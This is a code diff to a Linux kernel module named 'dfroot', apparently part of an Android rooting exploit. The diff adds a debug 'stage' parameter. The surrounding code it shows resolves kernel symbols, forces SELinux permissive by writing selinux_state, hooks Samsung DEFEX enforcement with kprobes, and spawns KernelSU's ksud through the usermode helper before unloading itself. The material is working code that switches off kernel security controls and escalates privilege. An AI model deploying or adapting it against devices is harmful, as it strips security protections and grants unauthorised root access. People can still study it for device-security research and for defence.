@@ -20,6 +20,13 @@ typedef int (*umh_exec_t)(void *info, int wait);
 static int soft_reboot;
 module_param(soft_reboot, int, 0);
 
+/* Set stage=N to stop after that step and leave the module loaded, so a
+ * reboot-at-triggering can be bisected without rebuilding: 1 selects the
+ * symbols only, 2 adds selinux permissive, 3 adds the defex kprobes, full
+ * run (default 0) also spawns ksud and self-unloads. */
+static int stage;
+module_param(stage, int, 0);
+
 /* The exploit stages the installed manager's ksud at this path and passes the
  * package name through insmod, so the late-load call matches the manager. */
 static char package_name[64] = "me.weishu.kernelsu";
@@ -135,8 +142,16 @@ static int __nocfi __init dirtyfrag_init(void)
         pr_err("dfroot: selinux_state not found\n");
         return -EINVAL;
     }
+    if (stage == 1) {
+        pr_info("dfroot: stage 1 done, symbols resolve\n");
+        return -E2BIG;
+    }
     WRITE_ONCE(*selinux_state, false);
     pr_info("dfroot: selinux_state permissive\n");
+    if (stage == 2) {
+        pr_info("dfroot: stage 2 done, selinux permissive\n");
+        return -E2BIG;
+    }
 
     defex_kp = (struct kprobe){ .addr = (kprobe_opcode_t *)get_addr("task_defex_enforce"),
                                 .pre_handler = defex_pre_handler };
@@ -151,6 +166,11 @@ static int __nocfi __init dirtyfrag_init(void)
         pr_err("dfroot: task_defex_user_exec not found\n");
     else
         pr_info("dfroot: task_defex_user_exec hooked\n");
+
+    if (stage == 3) {
+        pr_info("dfroot: stage 3 done, defex kprobes registered\n");
+        goto out_unload;
+    }
 
     umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
     umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
@@ -171,6 +191,7 @@ static int __nocfi __init dirtyfrag_init(void)
     ret = umh_exec(info, UMH_WAIT_PROC);
     pr_info("dfroot: usermodehelper_exec returned %d\n", ret);
 
+out_unload:
     if (defex_kp.addr) unregister_kprobe(&defex_kp);
     if (umh_kp.addr)   unregister_kprobe(&umh_kp);
     return -E2BIG; /* return any error to unload module */
